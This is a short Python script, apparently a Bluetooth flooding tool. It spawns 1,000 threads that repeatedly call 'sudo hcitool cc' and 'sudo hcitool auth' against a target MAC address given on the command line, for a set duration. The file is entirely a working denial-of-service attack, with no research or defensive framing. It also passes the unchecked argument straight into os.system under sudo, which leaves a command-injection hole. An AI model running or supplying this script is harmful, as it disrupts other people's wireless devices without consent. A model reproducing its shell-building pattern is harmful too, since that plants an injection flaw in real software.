import time
import os
import sys
import threading

attacktimeint = 60

if len(sys.argv) >= 2:
    attackmac = str(sys.argv[1])

if len(sys.argv) >= 3:
    attacktimeint = float(sys.argv[2])

timeout = time.time() + attacktimeint


# Create a shared variable for thread counts
thread_num = 0
thread_num_mutex = threading.Lock()
num_requests = 1000


# Print thread status
def print_status():
    global thread_num
    thread_num_mutex.acquire(True)

    thread_num += 1
    print ("\n " + "[" + str(thread_num) + "] #-#-#-#-#-#")

    thread_num_mutex.release()


# Perform the request
def attack():
    print_status()

    while True:
	    os.system("sudo hcitool cc --role=m "+ attackmac)
	    os.system("sudo hcitool auth "+ attackmac )
	    if time.time() > timeout:
	        break


# Spawn a thread per request
all_threads = []
for i in range(num_requests):
    t1 = threading.Thread(target=attack)
    t1.start()
    all_threads.append(t1)

for current_thread in all_threads:
    current_thread.join()  # Make the main thread wait for the children threads
